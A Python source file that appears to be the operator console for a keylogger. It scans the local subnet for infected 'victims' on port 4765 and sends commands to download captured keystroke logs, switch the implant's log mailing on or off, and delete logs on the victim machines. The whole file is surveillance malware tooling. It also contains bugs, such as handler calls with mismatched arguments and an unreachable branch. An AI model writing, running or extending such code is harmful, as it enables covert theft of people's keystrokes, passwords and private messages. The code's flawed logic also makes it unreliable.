import socket
from get_local_addr import get_local_addr
import os


def main():

    PORT = 4765

    try:
        victims = scan_lan(PORT)
        parse_cmd(victims, PORT)
    except (ConnectionAbortedError, ConnectionResetError):
        print("[-] Connection to server lost")
        parse_cmd(victims, PORT)


def scan_lan(PORT):
    local_addr = get_local_addr()
    subnet = '.'.join(local_addr.split('.')[:-1])
    victims = []
    for i in range(1, 255):
        addr = subnet + '.' + str(i)
        try:
            os.system('clear')
            print("[*] Checking address: " + addr)
            temp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp.settimeout(0.25)
            temp.connect((addr, PORT))
            victims.append(addr)
            temp.close()
        except:
            temp.close()
            continue
    os.system('clear')

    if len(victims) > 0:
        print("[+] Available victims:")
        print("-----------------------------")
        i = 0
        for addr in victims:
            print('[' + str(i) + '] ' + addr)
            i += 1
        print("-----------------------------")
    else:
        print("[-] No available victims found")
        print("[!] Try running 'rescan' later")

    return victims


def parse_cmd(victims, PORT):
    cmd = input("OYE> ")
    try:
        if len(cmd.split(' ')) > 1:
            if 0 < len(cmd.split(' ')[0]) < 5:
                if cmd.split(' ')[0] == 'all':
                    target = 'all'
                else:
                    target = victims[int(cmd.split(' ')[0])]
            elif 0 > len(cmd.split(' ')[0]):
                target = cmd.split(' ')[0]
            else:
                print("[-] Invalid target")
                parse_cmd(victims, PORT)
        else:
            target = '0.0.0.0'
    except (IndexError, ValueError):
        print("[-] Target not on list")
        print("[!] Try running 'rescan' and try again")
        parse_cmd(victims, PORT)

    if len(cmd.split(' ')) > 1:
        intent = ' '.join(cmd.split(' ')[1:])
    else:
        intent = cmd

    if intent == 'getlog':
        if target == 'all':
            for addr in victims:
                get_log(addr, PORT, intent, victims)
        else:
            get_log(target, PORT, intent, victims)
        parse_cmd(victims, PORT)
    elif intent == 'mailoff':
        if target == 'all':
            for addr in victims:
                mail_off(addr, PORT, victims, intent)
        else:
            mail_off(target, PORT, victims, intent)
        parse_cmd(victims, PORT)
    elif intent == 'mailon':
        if target == 'all':
            for addr in victims:
                mail_on(addr, PORT, victims, intent)
        else:
            mail_on(target, PORT, victims, intent)
        parse_cmd(victims, PORT)
    elif intent == 'rmlog':
        if target == 'all':
            for addr in victims:
                rm_log(addr, PORT, victims, intent)
        else:
            rm_log(target, PORT, victims, intent)
        parse_cmd(victims, PORT)
    elif intent == 'rescan':
        main()
    elif intent == 'clear':
        os.system("clear")
        parse_cmd(victims, PORT)
    elif intent == 'help' or intent == '?':
        print("[!] Syntax: <target> <command> OR <command>")
        print("[!] Available commands: getlog, mailoff, mailon, rmlog, rescan, clear, help, exit, quit")
        parse_cmd(victims, PORT)
    elif intent == 'exit' or intent == 'quit':
        os.system("clear")
        print("[*] Exiting...\n")
        exit(0)
    else:
        print("[-] Unknown command '" + cmd + "'")
        print("[!] Syntax: <target> <command> OR <command>")
        print("[!] Available commands: getlog, mailoff, mailon, rmlog, rescan, clear, help, exit, quit")
        parse_cmd(victims, PORT)


def get_log(target, PORT, intent):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[*] Connecting to", target+':'+str(PORT))
        s.connect((target, PORT))
        print(s.recv(26).decode('utf-8'))
        s.send(intent.encode())
        if not os.path.exists('/sdcard/keylogs/'):
            os.makedirs('/sdcard/keylogs/')
        f = open('/sdcard/oyes_klog_' + target + '.txt', 'w')
        l = s.recv(1024)
        while l:
            f.write(l.decode('utf-8'))
            l = s.recv(1024)
        f.close()
        s.close()
        print("[+] Log received")
    except ConnectionRefusedError:
        print("[-] Server went offline")


def mail_off(target, PORT, intent):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[*] Connecting to", target+':'+str(PORT))
        s.connect((target, PORT))
        print(s.recv(26).decode('utf-8'))
        s.send(intent.encode())
        s.close()
    except ConnectionRefusedError:
        print("[-] Server went offline")


def mail_on(target, PORT, intent):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[*] Connecting to", target+':'+str(PORT))
        s.connect((target, PORT))
        print(s.recv(26).decode('utf-8'))
        s.send(intent.encode())
        s.close()
    except ConnectionRefusedError:
        print("[-] Server went offline")


def rm_log(target, PORT, intent):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[*] Connecting to", target+':'+str(PORT))
        s.connect((target, PORT))
        print(s.recv(26).decode('utf-8'))
        s.send(intent.encode())
        s.close()
    except ConnectionRefusedError:
        print("[-] Server went offline")


if __name__ == "__main__":
    main()
